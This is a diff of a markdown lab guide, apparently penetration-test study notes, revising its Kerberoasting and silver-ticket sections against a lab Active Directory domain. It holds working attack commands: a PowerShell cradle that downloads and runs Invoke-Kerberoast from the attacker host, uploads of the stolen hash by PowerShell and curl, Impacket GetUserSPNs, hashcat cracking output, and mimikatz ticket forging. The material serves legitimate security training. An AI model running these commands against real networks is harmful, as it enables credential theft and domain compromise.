@@ -145,7 +145,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ## 1.3. Use GetNPUsers.py to get password hash
 
-☝️ All impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
+☝️ All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
 
 ```console
 ┌──(root㉿kali)-[~]
@@ -499,7 +499,7 @@ C:\Windows\system32>hostname
 SVR
 ```
 
-# 4. Service Account Attack
+# 4. Service Account Attack (Kerberoasting)
 
 ## 4.1. Discover SPNs
 
@@ -521,155 +521,71 @@ CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
 Existing SPN found!
 ```
 
-## 4.2. Kerberoasting
+## 4.2. Extract service ticket hashs
 
-### 4.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package
+### 4.2.1. Extract on Windows target using Invoke-Kerberoast script from powershell-empire
 
-**On Target:** Request tickets from PowerShell
+**On Kali**: Prepare web server for `Invoke-Kerberoast.ps1` download
 
-```cmd
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
-```
+Prepare files to web server root
 
-**Sample Results:**
+☝️ Apache2 is already running with DocumentRoot at `/var/www/html`
 
-```cmd
-PS C:\Users\mike> klist
+If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &` to run a web server endpoint, the web server root will be the `pwd` where the command was run
 
-Current LogonId is 0:0xa48995
-
-Cached Tickets: (3)
-
-⋮
-
-#2>     Client: mike @ LAB.VX
-        Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
-        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
-        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
-        Start Time: 4/16/2022 10:00:51 (local)
-        End Time:   4/16/2022 19:53:54 (local)
-        Renew Time: 4/23/2022 9:53:54 (local)
-        Session Key Type: RSADSI RC4-HMAC(NT)
-        Cache Flags: 0
-        Kdc Called: DC.lab.vx
-
-⋮
-```
-
-**On Target:** Dump tickets using mimikatz
-
-- ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
 
 ```console
-mimikatz # kerberos::list /export
-
-⋮
-
-[00000001] - 0x00000017 - rc4_hmac_nt
-   Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
-   Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
-   Client Name       : mike @ LAB.VX
-   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
-   * Saved to file     : 2-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
-
-⋮
+cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html
 ```
 
-- ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
-- e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors
-
-**On Target:** Upload the ticket to Kali
-
-```cmd
-scp <ticket> kali@kali.vx:/home/kali/
-```
-
-#### Use the Kerberoast package to extract the hash from the service ticket
-
-**On Kali:** Install kerberoast module
-
-- Ref: <https://github.com/nidem/kerberoast>
-
-```console
-sudo apt -y install kerberoast
-```
-
-**On Kali:** Extract service account hash from the ticket exported by mimikatz
-
-```console
-┌──(root㉿kali)-[~]
-└─$ python3 /usr/share/kerberoast/kirbi2john.py 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi > tgs.hash
-tickets written: 1
-```
-
-### 4.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire
-
-#### Dump password hash
-
-**On Kali:** Setup web server to host `Invoke-Kerberoast.ps1`
-
-```console
-cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .
-sudo python3 -m http.server 80 &> /dev/null &
-```
-
-**On Target:** Download and run `Invoke-Kerberoast`
-
-- Download: `(New-Object System.Net.WebClient).DownloadFile()`
-- Run: `Invoke-Kerberoast`
+**On Target**: Download and run `Invoke-Kerberoast.ps1`
 
 ```cmd
 powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
 ```
 
-**On Target:** Upload the hash to Kali
+Upload the hash to Kali
 
-```cmd
-scp tgs.hash kali@kali.vx:/home/kali/
+☝️ Apache2 is already running with uploads folder and `upload.php` configured
+
+|   |   |
+|---|---|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','tgs.hash')`|
+|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"tgs.hash" -v http://kali.vx/upload.php`|
+
+Move hash file to working folder: `mv /var/www/html/uploads/tgs.hash .`
+
+### 4.2.2. Extract from Kali Linux using GetUserSPNs from Impacket
+
+☝️ All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-GetUserSPNs lab.vx/john:P@ssw0rd -dc-ip 192.168.17.11 -outputfile tgs.hash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName      Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
+------------------------  --------  --------  --------------------------  --------------------------  ----------
+host/fs.lab.vx            ADFSSVC             2022-10-24 12:52:02.493613  2022-11-02 08:14:53.777575
+MSSQLSvc/SVR.lab.vx:1433  MSSQLSVC            2022-10-24 12:52:02.806113  2022-11-02 08:14:41.802510
+MSSQLSvc/SVR.lab.vx       MSSQLSVC            2022-10-24 12:52:02.806113  2022-11-02 08:14:41.802510
 ```
 
 ## 4.3. Cracking service account hash using hashcat
 
-#### Unpack existing `rockyou.txt` (❗14 million records❗)
-
 ```console
 ┌──(root㉿kali)-[~]
-└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
-```
-
-#### Use the hashcat to crack the service ticket
-
-❗USE HASHCAT, IT'S HELLA FASTER❗
-
-It doesn't matter that `rockyou.txt` has 14 million records, the time taken by hashcat is about the same
-- Hashcat takes about **27s** to build a dictionary cache of the wordlist
-- If there is a cache hit, cracking the password takes only about **2.7s**
-
-#### Crack the hash
-
-```console
-┌──(root㉿kali)-[~]
-└─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
+└─$ hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
 $krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*•••hash-truncated•••:P@ssw0rd
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
-⋮
-Started: Wed Oct 26 20:51:46 2022
-Stopped: Wed Oct 26 20:52:13 2022
-
-real    0m27.158s
-user    0m25.597s
-sys     0m0.333s
+$krb5tgs$23$*MSSQLSVC$LAB.VX$lab.vx/MSSQLSVC*•••hash-truncated•••:P@ssw0rd
+$krb5tgs$23$*ADFSSVC$LAB.VX$lab.vx/ADFSSVC*•••hash-truncated•••:P@ssw0rd
 ```
 
-## 4.5. Silver Ticket
+## 4.4. Silver Ticket
 
-### 4.5.1. Retrieve domain's numeric identifier
+### 4.4.1. Retrieve domain's numeric identifier
 
 Security Identifier or SID format: `S-R-I-S`
 - `S` - A literal `S` to identify the string as a SID
@@ -690,7 +606,7 @@ User Name SID
 lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
 ```
 
-### 4.5.2. Generate hash value for service account password
+### 4.4.2. Generate hash value for service account password
 
 ```cmd
 mimikatz # kerberos::hash /password:P@ssw0rd
@@ -700,7 +616,7 @@ mimikatz # kerberos::hash /password:P@ssw0rd
         * des_cbc_md5       76fdfece25e3da54
 ```
 
-### 4.5.3. Purge existing kerberos tickets
+### 4.4.3. Purge existing kerberos tickets
 
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 ```cmd
@@ -708,7 +624,7 @@ mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 ```
 
-### 4.5.4. Generate KRB_TGS ticket
+### 4.4.4. Generate KRB_TGS ticket
 
 - ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`
 
@@ -734,7 +650,7 @@ Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
 Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
 ```
 
-### 4.5.5. Verify ticket
+### 4.4.5. Verify ticket
 
 ```cmd
 C:\Users\dummy>klist
@@ -755,7 +671,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-### 4.5.6. Attempt login to service
+### 4.4.6. Attempt login to service
 
 ```cmd
 C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
